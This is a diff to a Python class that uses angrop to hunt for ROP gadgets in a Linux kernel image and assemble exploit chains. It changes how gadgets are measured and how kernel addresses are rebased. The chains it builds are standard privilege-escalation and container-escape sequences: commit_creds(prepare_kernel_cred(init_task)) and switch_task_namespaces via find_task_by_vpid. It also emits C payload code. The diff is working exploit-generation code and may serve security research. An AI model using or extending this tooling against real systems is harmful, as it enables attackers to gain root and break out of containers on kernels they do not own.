@@ -92,14 +92,13 @@ class RopGeneratorAngrop:
         self._addr_to_symbol = {
             addr: name for name, addr in self._symbol_map.items()
         }
-        # vmlinux is not marked PIE but we want the rebase option in angrop turned
-        # on
-        self._project.loader.main_object.pic = True
-        # hack to only rebase the correct values
-        self._project.loader.main_object.mapped_base = (
-            self._project.loader.main_object.segments[0].vaddr
-        )
         self._rop = self._load_angrop()
+
+    def _addr_in_kernel(self, addr):
+        segs = [x for x in self._project.loader.main_object.segments if x.vaddr != 0]
+        min_addr = min(x.min_addr for x in segs)
+        max_addr = max(x.max_addr for x in segs)
+        return min_addr <= addr < max_addr
 
     def _find_symbol_addr(self, func_name):
         if not func_name in self._symbol_map:
@@ -150,14 +149,16 @@ class RopGeneratorAngrop:
           RopGeneratorAngropError: if no gadget is found
         """
         shortest_gadget = None
+        shortest_length = None
 
         for gadget in self._rop.rop_gadgets:
             if gadget.changed_regs == {reg_name} and gadget.popped_regs == {reg_name}:
                 if (
                     shortest_gadget is None
-                    or gadget.block_length < shortest_gadget.block_length
+                    or self._project.factory.block(gadget.addr).size < shortest_length
                 ):
                     shortest_gadget = gadget
+                    shortest_length = self._project.factory.block(gadget.addr).size
 
         if shortest_gadget:
             offs = shortest_gadget.addr - KERNEL_BASE_ADDRESS
@@ -224,7 +225,6 @@ class RopGeneratorAngrop:
                 bytes_per_pop = self._project.arch.bytes
                 for _ in range(gadget.stack_change // bytes_per_pop - 1):
                     chain.add_value(0)
-                chain.print_payload_code()
                 return chain
 
         return None
@@ -242,20 +242,25 @@ class RopGeneratorAngrop:
             chain_mov_regs = self._rop.move_regs(**{"rdi": "rax"})
         except angrop.errors.RopException:
             pass
-
         if not chain_mov_regs:
             chain_mov_regs = self.mov_reg_memory_writes()
 
         if not chain_mov_regs:
             raise RopGeneratorError("Unable to find a mov rdi, rax gadget.")
 
-        for value, rebased in chain_mov_regs._concretize_chain_values():  # pylint: disable=protected-access
-            if rebased:
-                return RopChainOffset(
+        items  = []
+        for value, _ in chain_mov_regs._concretize_chain_values():  # pylint: disable=protected-access
+            if self._addr_in_kernel(value):
+                items.append(RopChainOffset(
                     kernel_offset=value - KERNEL_BASE_ADDRESS,
-                    description=f"mov rdi, rax")
+                    description=f"mov rdi, rax"))
             else:
-                return RopChainConstant(value)
+                items.append(RopChainConstant(value))
+
+        assert chain_mov_regs.next_pc_idx() == len(items)-1  # hopefully this always happens
+        items = items[:-1]
+
+        return items
 
     def find_memory_write(self):
         """Finds the shortest ROP gadget with a single memory write where the address is controlled by 'rsi' 
@@ -264,6 +269,7 @@ class RopGeneratorAngrop:
         # TODO use angrop directly when issue is handled
 
         shortest_gadget = None
+        shortest_length = None
 
         for gadget in self._rop.rop_gadgets:
             if len(gadget.mem_writes) == 1:  # Consider only gadgets with exactly one memory write
@@ -276,8 +282,9 @@ class RopGeneratorAngrop:
                     and 'rdi' in mem_write.data_controllers
                     and mem_write.data_size == 64
                 ):
-                    if shortest_gadget is None or gadget.block_length < shortest_gadget.block_length:
+                    if shortest_gadget is None or self._project.factory.block(gadget.addr).size < shortest_length:
                         shortest_gadget = gadget
+                        shortest_length = self._project.factory.block(gadget.addr).size
 
         if shortest_gadget:
             return shortest_gadget.addr - KERNEL_BASE_ADDRESS
@@ -327,7 +334,7 @@ class RopGeneratorAngrop:
 
         concrete_vals = rop_chain._concretize_chain_values(
         )  # pylint: disable=protected-access
-        for value, rebased in concrete_vals:
+        for value, _ in concrete_vals:
 
             instruction_code = ""
             if print_instructions:
@@ -342,7 +349,7 @@ class RopGeneratorAngrop:
                     if asmstring:
                         instruction_code = "\t// " + asmstring
 
-            if rebased:
+            if self._addr_in_kernel(value):
                 # Get the base address from the first segment
                 value -= self._project.loader.main_object.segments[0].vaddr
                 payload += ROP_REBASE_C_FORMAT.format(
@@ -400,7 +407,7 @@ class RopGeneratorAngrop:
             self._find_pop_one_reg("rdi"),
             self._find_symbol(INIT_TASK),
             self._find_symbol(PREPARE_KERNEL_CRED),
-            self._mov_rdi_rax(),
+            *self._mov_rdi_rax(),
             self._find_symbol(COMMIT_CREDS)
         ]
 
@@ -418,7 +425,7 @@ class RopGeneratorAngrop:
             self._find_pop_one_reg("rdi"),
             vpid,
             self._find_symbol(FIND_TASK_BY_VPID),
-            self._mov_rdi_rax(),
+            *self._mov_rdi_rax(),
             self._find_pop_one_reg("rsi"),
             self._find_symbol(INIT_NSPROXY),
             self._find_symbol(SWITCH_TASK_NAMESPACES)
